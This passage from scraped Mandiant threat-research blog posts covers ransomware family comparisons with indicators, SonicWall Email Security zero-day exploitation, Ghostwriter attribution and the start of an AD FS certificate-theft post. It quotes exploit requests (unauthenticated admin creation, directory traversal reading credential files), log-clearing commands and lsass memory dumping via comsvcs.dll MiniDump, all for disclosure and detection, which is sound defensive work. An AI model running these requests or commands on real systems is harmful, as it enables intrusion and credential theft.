A Salsa20 key is generated and encrypts a second 32 byte seed value. The encrypted result is XOR’d with the first seed, resulting in a 32 byte key used to AES encrypt each file. After each file is encrypted, the original file size, magic value of DE C0 AD BA, and AES key are encrypted with the public RSA key and appended to the file. HELLOKITTY and FIVEHANDS appends this additional metadata to the encrypted file, while DEATHRANSOM does not. Lastly it appends the four magic bytes DA DC CC AB to the end of the encrypted file. Depending on the version, HELLOKITTY may or may not change the file extension. Other samples of HELLOKITTY have used an embedded NTRU public key instead of RSA. FIVEHANDS Encryption FIVEHANDS uses an embedded NTRU public key. This NTRU key is SHA512 hashed and the first 32 bytes are used as the victim ID within the ransom note. This NTRU pubic key is also used to encrypt each file's symmetric key. For the symmetric key, FIVEHANDS uses an embedded generation routine to produce 16 random bytes used for an AES key to encrypt each file. After each file is encrypted, the original file size, magic value of DE C0 AD BA, and AES key are encrypted with the public NTRU key and appended to the file. The four magic bytes DB DC CC AB are appended to the end of the encrypted file. FIVEHANDS includes additional code not found in DEATHRANSOM and HELLOKITTY to use the Windows Restart Manager to close a file currently in use so that it can be unlocked and successfully encrypted. The encrypted file extension is changed to .crypt  extension FIVEHANDS's encryption flow and sequence is very different from the other two, partially because it incorporates asynchronous I/O requests and uses different embedded encryption libraries. FIVEHANDS Encrypted Dropper One significant change between DEATHRANSOM and FIVEHANDS is the use of a memory-only dropper, which upon execution, expects a command line switch of -key followed by the key value necessary to perform decryption of its payload. The payload is stored and encrypted with AES-128 using an IV of “85471kayecaxaubv”. The decrypted FIVEHANDS payload is immediately executed after decryption. To date, Mandiant has only observed encrypted droppers with a common imphash of 8517cf209c905e801241690648f36a97. CLI arguments FIVEHANDS can receive a CLI argument for a path, this limits the ransomware's file encryption activities to the specified directory. DEATHRANSOM and HELLOKITTY do not accept CLI arguments. Locale and Mutex checks DEATHRANSOM performs language ID and keyboard layout checks. If either of these match Russian, Kazakh, Belarusian, Ukrainian or Tatar it exits. Neither HELLOKITTY or FIVEHANDS perform language ID or keyboard checks. HELLOKITTY performs a mutex check while the other two do not perform mutex checks. File Exclusions DEATHRANSOM and HELLOKITTY both exclude the same directories and files: programdata, $recycle.bin, program files, windows, all users, appdata, read_me.txt, autoexec.bat, desktop.ini, autorun.inf, ntuser.dat, iconcache.db, bootsect.bak, boot.ini, ntuser.dat.log, or thumbs.db. The exclusions for FIVEHANDS are more extensive and contain additional files and directories to ignore. Additional Differences DEATHRANSOM makes an external HTTPS connection to download a file. Neither HELLOKITTY or FIVEHANDS initiate network connections. HELLOKITTY contains code to set the victims wallpaper to a ransom related image. The other samples do not have this functionality Different versions of DEATHRANSOM and HELLOKITTY are known to change the file extension Different versions of HELLOKITTY are known to check for specific processes to terminate. Feature FIVEHANDS HELLOKITTY DEATHRANSOM Programming Language C++ C++ C Symmetric Encryption AES 128 AES 256 AES 256 Asymmetric Encryption Embedded NTRU Key Embedded RSA or NTRU Key Curve25519 ECDH and RSA key creation Same directory and file name exclusions No Yes Yes Accepts CLI Arguments Yes No No Network Connections No No Yes Locale Check No No Yes Mutex Check No Yes No Bytes Appended to Encrypted Files DB DC CC AB DA DC CC AB AB CD EF AB Table 1: Ransomware feature comparison Conclusion Mandiant observed SOMBRAT and FIVEHANDS ransomware by the same group since January 2021. While similarities between HELLOKITTY and FIVEHANDS are notable, ransomware may be used by different groups through underground affiliate programs. Mandiant will assign an uncategorized cluster based on multiple factors including infrastructure used during intrusions and as such, not all SOMBRAT or FIVEHANDS ransomware intrusions may have been conducted by UNC2447. WARPRISM and FOXGRABBER have been used in SUNCRYPT and DARKSIDE ransomware demonstrating additional complexity and sharing between different ransomware affiliate programs. Indicators SOMBRAT UNC2447 87c78d62fd35bb25e34abb8f4caace4a 6382d48fae675084d30ccb69b4664cbb (31dcd09eb9fa2050aadc0e6ca05957bf unxored) SOMBRAT Launcher cf1b9284d239928cce1839ea8919a7af (wwansvc.a XOR key) 4aa3eab3f657498f52757dc46b8d1f11 (wwansvc.c) 1f6495ea7606a15daa79be93070159a8 (wwansvc.bat) 31dcd09eb9fa2050aadc0e6ca05957bf (wwansvc.b) edf567bd19d09b0bab4a8d068af15572 (wwansvc.b) a5b26931a1519e9ceda04b4c997bb01f (wwansvc.txt) f0751bef4804fadfe2b993bf25791c49 (4aa3eab3f657498f52757dc46b8d1f11 unxored) 87c78d62fd35bb25e34abb8f4caace4a (edf567bd19d09b0bab4a8d068af15572 unxored) SOMBRAT domains Celomito[.]com (unc2447) Feticost[.]com (unc2447) Cosarm[.]com Portalcos[.]com FIVEHANDS 39ea2394a6e6c39c5d7722dc996daf05 f568229e696c0e82abb35ec73d162d5e FIVEHANDS Encrypted Dropper 6c849920155f48d4b4aafce0fc49eb5b 22d35005e926fe29379cb07b810a6075 57824214710bc0cdb22463571a72afd0 87c0b190e3b4ab9214e10a2d1c182153 1b0b9e4cddcbcb02affe9c8124855e58 46ecc24ef6d20f3eaf71ff37610d57d1 1a79b6d169aac719c9323bc3ee4a8361 a64d79eba40229ae9aaebbd73938b985 HELLOKITTY 136bd70f7aa98f52861879d7dca03cf2 06ce6cd8bde756265f95fcf4eecadbe9 af568e8a6060812f040f0cb0fd6f5a7b d96adf82f061b1a6c80699364a1e3208 DEATHRANSOM c50ab1df254c185506ab892dc5c8e24b WARPRISM c925822c6d5175c30ba96388b07e9e16 (unc2447) c171bcd34151cbcd48edbce13796e0ed d87fcd8d2bf450b0056a151e9a116f72 f739977004981fbe4a54bc68be18ea79 e18b27f75c95b4d50bfcbcd00a5bd6c5 df6e6b3e53cc713276a03cce8361ae0f 1cd03c0d00f7bfa7ca73f7d73677d8f8 8071f66d64395911a7aa0d2057b9b00d c12a96e9c50db5f8b0b3b5f9f3f134f0 e39184eacba2b05aaa529547abf41d2b 09a05a2212bd2c0fe0e2881401fbff17 8226d7615532f32eca8c04ac0d41a9fd a01a2ba3ae9f50a5aa8a5e3492891082 29e53b32d5b4aae6d9a3b3c81648653c a809068b052bc209d0ab13f6c5c8b4e7 BEACON UNC2447 64.227.24[.]12 Havex Profile January 2021 157.230.184[.]142  chches_ APT10 Profile November 2020-January 2021 74c688a22822b2ab8f18eafad2271cac 7d6e57cbc112ebd3d3c95d3c73451a38 FOXGRABBER 4d3d3919dda002511e03310c49b7b47f FireEye Detections FireEye Network Security FireEye Email Security FireEye Detection On Demand FireEye Malware Analysis FireEye Malware File Protect FIVEHANDS FE_Loader_Win32_Generic_162 FE_Ransomware_Win32_FIVEHANDS_1 Malware.Binary.exe Ransomware.Win.Generic.MVX SOMBRAT FE_Backdoor_Win64_SOMBRAT_1 Backdoor.Win.SOMBRAT Malware.Binary.exe Backdoor.Win.SOMBRAT.MVX FEC_Trojan_PS1_Generic_7 FEC_Trojan_PS1_Generic_8 FEC_Trojan_BAT_Generic_5 HELLOKITTY Ransomware.Win.Generic.MVX Malware.Binary.exe Ransomware.Win.HELLOKITTY.MVX FE_Ransomware_Win_HELLOKITTY_1 FE_Ransomware_Win32_HELLOKITTY_1 DEATHRANSOM FE_Loader_Win32_Generic_92 Ransomware.Win.Generic.MVX Malware.Binary.exe BEACON FE_Loader_Win32_BLUESPINE_1 Backdoor.BEACON Malware.Binary.exe WARPRISM FE_Loader_PS1_WARPRISM_1 FEC_Loader_PS1_WARPRISM_1 Backdoor.BEACON Trojan.Generic Trojan.Win.SYSTEMBC Backdoor.Meterpreter Loader.PS1.WARPRISM.MVX Malware.Binary.exe Malware.Binary.ps1 FOXGRABBER FE_Tool_MSIL_FOXGRABBER_1 FE_Trojan_MSIL_Generic_109 FireEye EndPoint Security Real-Time (IOC) SOMBRAT (BACKDOOR) SUSPICIOUS POWERSHELL READ BASE64 DATA (METHODOLOGY) FIVEHANDS RANSOMWARE (FAMILY) DEATHRANSOM RANSOMWARE (FAMILY) HELLOKITTY RANSOMWARE (FAMILY) BEACON (FAMILY) Malware Protection (AV/MG) SOMBRAT Generic.mg. 87c78d62fd35bb25 Generic.mg.6382d48fae675084 Trojan.GenericKD.45750384 Trojan.GenericKD.36367848 Generic.PwShell.RefA.CB5E962A FIVEHANDS Generic.mg.39ea2394a6e6c39c Generic.mg.f568229e696c0e82 Generic.mg.6c849920155f48d4 Generic.mg.22d35005e926fe29 Generic.mg.57824214710bc0cd Generic.mg.87c0b190e3b4ab92 Generic.mg.1b0b9e4cddcbcb02 Generic.mg.46ecc24ef6d20f3e Generic.mg.1a79b6d169aac719 Generic.mg.a64d79eba40229ae Gen:Variant.Zusy.375932 Gen:Variant.Zusy.366866 Trojan.GenericKD.46059492 Trojan.GenericKD.46059131 Trojan.GenericKD.45996121 Trojan.GenericKD.45702783 WARPRISM Generic.mg.a01a2ba3ae9f50a5 Trojan.PowerShell.Agent.IJ Trojan.Agent.EXDR Trojan.PowerShell.Ransom.E Trojan.Agent.EUKPTrojan.GenericKD.45856129 Heur.BZC.PZQ.Boxter.829.B5AEB7A6 Heur.BZC.PZQ.Boxter.829.B84D01A7 Heur.BZC.PZQ.Boxter.829.AE76D25C Trojan.PowerShell.Ransom.F Dropped:Heur.BZC.MNT.Boxter.826.0A2B3A87 Heur.BZC.PZQ.Boxter.829.A15701BD DEATHRANSOM Generic.mg.c50ab1df254c1855 Trojan.Ransomware.GenericKD.35760206 HELLOKITTY Generic.mg.136bd70f7aa98f52 Generic.mg.06ce6cd8bde75626 Generic.mg.af568e8a6060812f Generic.mg.d96adf82f061b1a6 Generic.Malware.PfVPk!12.299C21F3 Gen:Variant.Ransom.HelloKitty.1 Generic.Malware.PfVPk!12.606CCA24 Generic.Malware.PfVPk!12.1454636C BEACON Generic.mg.74c688a22822b2ab Generic.mg.7d6e57cbc112ebd3 Trojan.Agent.DDSN MITRE ATT&CK Tactic Description Initial Access T1078 Valid Accounts Execution T1047 Windows Management Instrumentation T1053.005 Scheduled Task / Job: Scheduled Task T1059.001 Command and Scripting Interpreter: PowerShell T1106 Execution through API Defense Evasion T1045 Software Packing T1055 Process Injection T1140 Deobfuscate / Decode Files or Information Discovery T1012 Query Registry T1046 Network Service Scanning T1057 Process Discovery T1082 System Information Discovery T1124 System Time Discovery T1135 Network Share Discovery Collection T1560.003 Archive Collected Data: Archive via Custom Method Impact T1485 Data Destruction T1486 Data Encrypted for Impact T1490 Inhibit System Recovery Command and Control T1071.001 Application Layer Protocol: Web Protocols T1090.002 Proxy: External Proxy T1572  Protocol Tunneling T1573.002 Encrypted Channel: Asymmetric Cryptography Exfiltration T1041 Exfiltration over C2 Channel Acknowledgements Thanks to Nick Richard for technical review, Genevieve Stark and Kimberly Goody for analytical contributions, and Jon Erickson, Jonathan Lepore, and Stephen Eckels for analysis incorporated into this blog post. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-20",
                    "source": "www.fireeye.com"
                },
                "text": "In March 2021, Mandiant Managed Defense identified three zero-day vulnerabilities in SonicWall’s Email Security (ES) product that were being exploited in the wild. These vulnerabilities were executed in conjunction to obtain administrative access and code execution on a SonicWall ES device. The adversary leveraged these vulnerabilities, with intimate knowledge of the SonicWall application, to install a backdoor, access files and emails, and move laterally into the victim organization’s network. The vulnerabilities are being tracked in the following CVEs: CVE-2021-20021 9.8 Unauthorized administrative account creation CVE-2021-20022 7.2 Post-authentication arbitrary file upload CVE-2021-20023 4.9 Post-authentication arbitrary file read Mandiant has been coordinating with the SonicWall Product Security and Incident Response Team (PSIRT) for the responsible disclosure of this information. SonicWall advises all customers and partners to upgrade to the 10.0.9.6173 Hotfix for Windows users, and the 10.0.9.6177 Hotfix for hardware and ESXi virtual appliance users. SonicWall Hosted Email Security product was automatically updated for all customers and no additional action is required for patching purposes. The hotfixes will also be superseded by the upcoming SonicWall ES 10.0.10 release. More information can be found by visiting the KB article published by SonicWall. All patches, upgrades, and hotfixes are available to download on the MySonicWall site . Overview Figure 1: SonicWall Email Security ecosystem overview (via SonicWall ) SonicWall Email Security (ES) is an email security solution that “ provides comprehensive inbound and outbound protection, and defends against advanced email-borne threats such as ransomware, zero-day threats, spear phishing and business email compromise (BEC) .” The solution can be deployed as a physical appliance, virtual appliance, software installation, or a hosted SaaS solution. Figure 2: Sample SonicWall Email Security login page Like many appliances, the solution provides a rich, web-accessible administrative interface that serves as the main avenue for product configuration. Depending on the customer’s deployment method, this software is potentially capable of running under Windows or Unix because it heavily leverages OS-independent Apache Tomcat and Java. While the solution doesn’t require that this interface be exposed to the internet, internet-wide scanning shows approximately 700 publicly reachable interfaces. Investigation In March 2021, Mandiant Managed Defense identified post-exploitation web shell activity on an internet-accessible system within a customer’s environment. Managed Defense isolated the system and collected evidence to determine how the system was compromised. The system was quickly identified as a SonicWall Email Security (ES) application running on a standard Windows Server 2012 installation. The adversary-installed web shell was being served through the HTTPS-enabled Apache Tomcat web server bundled with SonicWall ES. Due to the web shell being served in the application’s bundled web server, we immediately suspected the compromise was associated with the SonicWall ES application itself. When we contacted the customer, we learned that the installation of SonicWall ES was the latest version available for download (10.0.9) and that there was no publicly available information pertaining to vulnerabilities or in-the-wild exploitation. To determine if a potential application-level vulnerability was exploited to install the web shell, Mandiant collected endpoint telemetry data. We soon identified post-exploitation activity aimed at destroying evidence on the system, executed in the context of the web shell. The adversary executed the following command, shortly after installing the web shell: cmd.exe /c \"echo \"\" > \"C:/Program Files (x86)/SonicWallES/logs/webUI/webui.json Figure 3: The Adversary clearing existing entries in the current “webui.json” log This command deleted the most recent application-level log entries recorded by the SonicWall ES web application. While clearing log files is a standard anti-forensics technique, understanding the location of internal log files generated by applications is usually overlooked by most spray-and-pray attackers. This added fuel to our suspicion that we were dealing with an adversary who had intimate knowledge of how the SonicWall ES application worked. Fortunately for us, additional log files and a previously created virtual server snapshot provided enough evidence to track down the vulnerabilities and the adversary’s activities on the host. Vulnerabilities CVE-2021-20021 Unauthenticated administrative access through improperly secured API endpoint The SonicWall Email Security application contains an authenticated control panel to provide administration capabilities. One feature available allows application administrators to authorize an additional administrator account from a separate Microsoft Active Directory Organization Unit (AD OU). https://<SonicWall ES host>/createou?data=<XML HERE> Figure 4: A redacted example of the vulnerable endpoint associated with arbitrary user creation Requests to this form, however, were not verified to require previous authentication to the appliance. Due to this vulnerability, an adversary with a well-crafted XML document could either GET or POST their document to the application and create a “role.ouadmin” account (Figure 4). This account could then be used to authenticate to the application as an administrator. CVE-2021-20022 Arbitrary file upload through post-authenticated “branding” feature Like many enterprise products with a web-based user interface, SonicWall Email Security includes a feature known as \"branding\" which gives administrators the ability to customize and add certain assets to the interface, such as company logos. These branding assets are managed via packages, and new packages can be created by uploading ZIP archives containing custom text, image files, and layout settings. A lack of file validation can enable an adversary to upload arbitrary files, including executable code, such as web shells. Once uploaded, these branding package ZIP archives are normally expanded and saved to the <SonicWall ES install path>\\data\\branding directory. However, an adversary could place malicious files in arbitrary locations, such as a web accessible Apache Tomcat directory, by crafting a ZIP archive containing a file within a sequence of directory traversal notations such as in Figure 5. Figure 5: Example ZIP archive containing a Zip Slip web shell It is important to note that the lack of validation which enables Zip Slip attacks is not unique to SonicWall Email Security. As detailed in Snyk's research on the topic , they exist within the many code libraries from which applications have been built. CVE-2021-20023 Directory-traversal leads to arbitrary file read in post-authenticated \"branding\" feature Mandiant confirmed another post-authentication vulnerability in the administrative panel’s built-in \"branding\" feature which allowed an adversary to retrieve arbitrary files from the host by sending crafted HTTP GET requests to a particular resource. Figure 6 demonstrates the formatting of such request. https://<SonicWall ES host>/dload_apps?action=<any value>&path=..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fcalc.exe&id=update Figure 6: An example web request which results in downloading the Windows calculator While the working directory of this branding feature is <SonicWall ES install path>\\data\\updates , a directory-traversal vulnerability allows an adversary to access files located outside of this directory. As the Apache Tomcat webserver handling this request is operating as the NT AUTHORITY\\SYSTEM account, any file on the operating system can be accessed. Combinations of all three exploits were leveraged interchangeably by the adversary to perform the following actions: Creation of a new Administrator account on the SonicWall ES device Exposure of the hashed passwords for existing, locally configured Administrative accounts The creation of a web shell in an arbitrary directory Real-time debugging of exploitation success and failure Post-Exploitation Upon obtaining administrative access to the appliance through CVE-2021-20021, an adversary sent crafted HTTP requests to the resource /dload_apps , a component of the application's \"branding\" feature, exploiting CVE-2021-20023. These requests leveraged directory traversal attacks, enabling access to two sensitive XML configuration files located at <SonicWall ES install path>\\data\\multi_accounts.xml and <SonicWall ES install path>\\data\\multi_ldap.xml , respectively (Figure 7). GET /dload_apps?action=REDACTED&path=..%2Fmulti_accounts.xml&id=update GET /dload_apps?action=REDACTED&path=..%2Fmulti_ldap.xml&id=update Figure 7: HTTP GET requests exploiting CVE-2021-20023 These files contained details about existing accounts as well as Active Directory credentials used by the application. Next, the adversary uploaded a ZIP archive containing the BEHINDER JSP web shell from the administrative panel's \"branding\" page. The crafted ZIP archive used a Zip Slip attack to exploit CVE-2021-20022, which caused the web shell to be written to the web-accessible Apache Tomcat directory <SonicWall ES install path>\\Apache Software Foundation\\Tomcat 9.0\\webapps\\SearchEngineRMIService\\ . BEHINDER is a publicly available, multi-platform web shell that accepts encrypted command and control (C2) communications. In principle, BEHINDER operates similarly to CHINA CHOPPER , a popular web shell that has been previously detailed by FireEye. Like CHINA CHOPPER, an adversary operates a client-side application to pass commands to the web shell within the body of HTTP requests. As the core functionality of the backdoor is contained within the client-side application, BEHINDER—much like CHINA CHOPPER—has the added benefit of being small, with the variant observed in this investigation weighing in at less than 1 kilobyte (Figure 8). Figure 8: The BEHINDER web shell observed by Mandiant, which executes AES encrypted and base64 encoded commands With the addition of a web shell to the server, the adversary had unrestricted access to the command prompt, with the inherited permissions of the NT AUTHORITY\\SYSTEM account. After clearing the SonicWall application “ webui.json ” log file, the adversary escalated their attack to credential harvesting in preparation of moving laterally into the victim's network. The adversary relied on “living off the land” techniques rather than bringing their own tools into the environment, which often has the benefit of potentially avoiding detections from a security product. We observed the adversary executing the reg save command to dump the HKLM\\SAM , HKLM\\SYSTEM , and HKLM\\SECURITY registry hives, which contain vital information in recovering password hashes and LSA secrets. Additionally, the adversary obtained in-memory sensitive credentials through the use of built-in memory dumping techniques. The adversary was observed invoking the MiniDump export of the Windows DLL comsvcs.dll to dump both the process memory for lsass.exe and the running instance of Apache Tomcat as seen in Figure 9. rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass PID> c:\\windows\\temp\\TS_LAS.dmp full rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump <Tomcat PID> C:\\windows\\temp\\TS_FF9DG.dmp full Figure 9: The adversary acquiring process memory for lsass.exe (MITRE ATT&CK T1003.001) and Apache Tomcat Mandiant typically observes adversaries employing short and easy-to-type filenames during their operations, simply for efficiency. As such, the aforementioned filenames initially stood out as being peculiar, as a mix of case and symbols would require more effort to type than is often necessary. While this could always be indicative of a tool being used, the slight variations between the two commands—the absence of a comma before the DLL export and the uppercase C:\\ drive in the second—suggest that they were manually typed. Considering that the C:\\Windows\\Temp\\ directory on a Windows host also normally contains numerous similarly named temporary files, the adversary was likely taking extra care to evade suspicion should the activity reach the screen of a security analyst. Continuing their effort to live off the land as much as possible, the adversary located a copy of the archiving utility 7-Zip already present on the host and used it to compress a subdirectory of <SonicWall ES install path>\\data\\archive\\ . This directory contains daily archives of emails processed by SonicWall ES—again demonstrating the adversary’s familiarity with the application. After a several-day lull in activity, the adversary returned to the host, presumably after working to recover passwords from the registry hives and process memory that was dumped earlier. At the time of activity, the victim organization was using the same local Administrator password across multiple hosts in their domain, which provided the adversary an easy opportunity to move laterally under the context of this account—highlighting the value of randomizing passwords to built-in Windows accounts on each host within a domain. We observed the adversary leveraging Impacket’s publicly available WMIEXEC.PY tool to access several internal hosts, which enabled remote command execution over Microsoft's DCOM protocol via Windows Management Instrumentation (WMI). The adversary managed to briefly perform internal reconnaissance activity prior to being isolated and removed from the environment. Attribution Mandiant currently tracks this activity as UNC2682. Ultimately, Mandiant prevented UNC2682 from completing their mission so their objectives of the attack currently remain unknown. Each investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations that Mandiant responds to. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. For more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors . Investigation & Monitoring Tips Mandiant recommends monitoring of the following endpoint telemetry indicators for potential evidence of compromise: Child processes of the web server process “tomcat” on SonicWall Email Security appliances, particularly cmd.exe The creation or existence of web shells on a server hosting SonicWall Email Security In addition to standard indicators, Mandiant recommends reviewing SonicWall-related internal configuration files and logs for evidence of previous adversary activity. Evidence of malicious web requests and their values may be identifiable in the following log files: The Apache Tomcat logs: C:\\Program Files\\SonicWallES\\Apache Software Foundation\\Tomcat 9.0\\logs The SonicWall application logs: C:\\Program Files\\SonicWallES\\logs\\webUI\\webui.json Evidence of unauthorized modifications to SonicWall configuration settings can be confirmed in the following files: The administration user account file: C:\\Program Files\\SonicWallES\\data\\multi_accounts.xml Additional user account files that may have been created in the following directories: C:\\Program Files\\SonicWallES\\data\\perhost C:\\Program Files\\SonicWallES\\data\\perldap C:\\Program Files\\SonicWallES\\data\\perou Branding related zip files in any of the subdirectories of the following directory: C:\\Program Files\\SonicWallES\\data\\branding Detecting the Techniques FireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of SonicWall ES exploitation or post-exploitation activities associated with this adversary. Product Signature FireEye Endpoint Security RUNDLL32.EXE COMSVCS.DLL PROCESS MINIDUMP (METHODOLOGY) SUSPICIOUS REGISTRY EXPORTS (METHODOLOGY) WEB SERVER ECHO REDIRECT (METHODOLOGY) WEB SERVER CMD.EXE TYPE RECON (METHODOLOGY) FireEye Network Security FireEye Email Security FireEye Detection On Demand FireEye Malware File Scanning FireEye Malware File Storage Scanning FE_PUP_Exploit_Linux_ZipSlip_1 FE_Exploit_Win_ZipSlip_1 FE_Trojan_ZIP_Generic_1 FE_Webshell_JSP_BEHINDER_1 FEC_Webshell_JSP_BEHINDER_1 Webshell.JSP.BEHINDER Webshell.JSP.BEHINDER.MVX FireEye Helix METHODOLOGY - LFI [Null-Byte URI] WMIEXEC UTILITY [Args] WINDOWS METHODOLOGY [Unusual Web Server Child Process] Additionally, SonicWall has deployed Intrusion Prevention System (IPS) signatures to SonicWall firewalls to help detect and block attacks that attempt to leverage the aforementioned vulnerabilities. The following signatures have already been applied to SonicWall firewalls with active security subscriptions: IPS Signature : 15520 WEB-ATTACKS SonicWall Email Security (CVE-2021-20022 Vulnerability) IPS Signature : 1067 WEB-ATTACKS Web Application Directory Traversal Attack 7 IPS Signature : 15509 WEB-ATTACKS Web Application Directory Traversal Attack 7 -c2 Mandiant Security Validation Actions Organizations can validate their security controls using the following actions with Mandiant Security Validation . VID Name A101-563 Malicious File Transfer - BEHINDER, Download, Variant #1 A101-566 Web Shell Activity - BEHINDER, Basic Shell Interaction A101-564 Malicious File Transfer - Zip Slip, Download, EICAR Variant A101-565 Phishing Email - Malicious Attachment, Zip Slip, Generic Themed Lure Vulnerability Disclosure Mandiant disclosed the vulnerabilities CVE-2021-20021 and CVE-2021-20022 to SonicWall Product Security Incident Response Team (PSIRT) on March 26, 2021. The vulnerabilities were acknowledged and validated on March 29, 2021 and a hotfix became available on April 9, 2021. The patch was communicated to impacted SonicWall customers and partners on April 9, 2021. Mandiant disclosed the vulnerability CVE-2021-20023 to SonicWall PSIRT on April 6, 2021. The vulnerability was acknowledged and validated on April 9, 2021 and a patch became available April 19. To mitigate the three CVEs, Mandiant and SonicWall recommend upgrading Email Security to version 10.0.9.6173 (Windows) or 10.0.9.6177 (Hardware & ESXi Virtual Appliances). Organizations using SonicWall Hosted Email Security (HES) products were automatically updated and no action is required for those customers. Acknowledgements SonicWall PSIRT, Charles Carmakal, Ben Fedore, Geoff Ackerman and Andrew Thompson. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/espionage-group-unc1151-likely-conducts-ghostwriter-influence-activity.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-28",
                    "source": "www.fireeye.com"
                },
                "text": "In July 2020, Mandiant Threat Intelligence released a public report detailing an ongoing influence campaign we named “Ghostwriter.” Ghostwriter is a cyber-enabled influence campaign which primarily targets audiences in Lithuania, Latvia and Poland and promotes narratives critical of the North Atlantic Treaty Organization’s (NATO) presence in Eastern Europe. Since releasing our public report, we have continued to investigate and report on Ghostwriter activity to Mandiant Intelligence customers. We tracked new incidents as they happened and identified activity extending back years before we formally identified the campaign in 2020. A new report by our Information Operations analysis, Cyber Espionage analysis, and Mandiant Research teams provides an update on Ghostwriter , highlighting two significant developments. We have observed an expansion of narratives, targeting and TTPs associated with Ghostwriter activity since we released our July 2020 report. For example, several recent operations have heavily leveraged the compromised social media accounts of Polish officials on the political right to publish content seemingly intended to create domestic political disruption in Poland rather than foment distrust of NATO. These operations, conducted in Polish and English, appear to have largely not relied on the dissemination vectors we have typically observed with previous Ghostwriter activity, such as website compromises, spoofed emails or posts from inauthentic personas. We have observed no evidence that these social media platforms were themselves in any way compromised, and instead believe account credentials were obtained using the compromised email accounts of targeted individuals. Recently obtained technical evidence now allows us to assess with high confidence that UNC1151, a suspected state-sponsored cyber espionage actor that engages in credential harvesting and malware campaigns, conducts at least some components of Ghostwriter influence activity; current intelligence gaps, including gaps pertaining to website compromises and the operation of false personas, do not allow us to conclusively attribute all aspects of the Ghostwriter campaign to UNC1151 at this time. We do not associate UNC1151 with any other previously tracked threat groups. Since the start of 2021, UNC1151 has expanded its credential theft activity to target German politicians. This targeting has been publicly reported in the German Tagesschau . The appendices of the report include an exhaustive table of incidents and operations we currently associate with Ghostwriter activity, a detailed case study of a recent Ghostwriter operation, and indicators of compromise (IOCs) related to UNC1151. Read the report today to learn more. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-27",
                    "source": "www.fireeye.com"
                },
                "text": "Organizations are increasingly adopting cloud-based services such as Microsoft 365 to host applications and data. Sophisticated threat actors are catching on and Mandiant has observed an increased focus on long-term persistent access to Microsoft 365 as one of their primary objectives. The focus on developing novel and hard to detect methods to achieve this goal was highlighted with the recent detection of UNC2452 and their access to Microsoft 365 . One of this group's key TTPs was to steal the Token Signing Certificate from an organization’s AD FS server to enable them to bypass MFA and access cloud services as any user, at any time. While defenders previously associated the defense of this certificate, and thus the entire ecosystem, with careful access control and detection efforts around the AD FS server and service account, this is no longer sufficient. In this blog post we will show how a threat actor, with the right privilege, can extract the encrypted Token Signing Certificate from anywhere on the internal network. Once extracted, a threat actor can easily decrypt it and begin accessing cloud services. Active Directory Federation Services Active Directory Federation Services (AD FS) is a feature for Windows Servers that enables federated identity and access management . It is often used by organizations to provide single sign-on functionality to access enterprise applications such as Microsoft 365. In technical terms, AD FS functions as an Identity Provider (IdP) and Microsoft 365 is a Service Provider (SP). We’ll use Microsoft 365 as an example going forward, but this technique could apply to any service that is set up to trust AD FS. AD FS verifies a user’s identity and issues assertions that describe the user. Microsoft 365  trusts AD FS to verify user identities and provide it with assertions. To Microsoft 365, it doesn’t matter how AD FS performed the verification, it just needs the assertions. In the typical deployment (Figure 1), AD FS will verify a user’s identity using Active Directory. At a minimum, an AD FS deployment consists of two servers in an enterprise’s on-premises network: the primary AD FS server, and an AD FS Web Application Proxy (WAP). The proxy is placed in the DMZ and has no functionality besides proxying sign-on attempts from the Internet to the AD FS server. The primary AD FS server receives proxied requests, verifies a user’s identity, and issues assertions that are packaged into SAML security tokens for the user. Figure 1: Typical AD FS deployment (source: Microsoft ) The SAML token issued by AD FS proves a user’s identity to Microsoft 365 and can also be used to make authorization decisions. The SAML token is an XML document with two main components: Assertions : Assertions are XML elements that describe the user’s identity. An assertion could be a user SID, group membership SIDs, or other elements like the user’s department name. A single SAML token can have multiple assertions attached to it. Digital Signature : The assertions in the SAML token are digitally signed using a public/private keypair that resides on the AD FS server. This is called the Token Signing Certificate. The Token Signing Certificate is the bedrock of security in AD FS. Microsoft 365 uses the digital signature to validate that the SAML token is authentic, valid, and comes from an AD FS server that it trusts. To enable this verification, an administrator shares the public component of the Token Signing Certificate with Microsoft 365. This is then used to cryptographically verify the digital signature in the SAML token and prove authenticity as well as integrity of the token. In other words, if a threat actor got hold of a Token Signing Certificate, they could generate arbitrary SAML tokens to access any federated application, as any user, and even bypass MFA. Golden SAML Golden SAML was coined in 2017 by CyberArk to describe the technique of forging SAML tokens to access SPs given a valid Token Signing Certificate. At TROOPERS 19 , I detailed how a threat actor could extract the Token Signing Certificate from an AD FS server, as well as some mitigation strategies for defenders. In a default AD FS configuration, the Token Signing Certificate is stored within a Windows Internal Database (WID) instance that is running on the AD FS server. WID is more or less MS SQL Express, except the database can only be accessed locally over a special named pipe connection. In AD FS, the database is further locked down to only the AD FS service account. The Token Signing Certificate is stored in an encrypted state in the IdentityServerPolicy.ServiceStateSummary table. Figure 2 contains a single row with a column that stores all the settings that AD FS will need on service start as an XML document. <SigningToken> <IsChainIncluded>false</IsChainIncluded> <IsChainIncludedSpecified>false</IsChainIncludedSpecified> <FindValue>99FABAEE46A09CD9B34B9510AB10E2B0C0ACB99B</FindValue> <RawCertificate></RawCertificate> <EncryptedPfx></EncryptedPfx> <StoreNameValue>My</StoreNameValue> 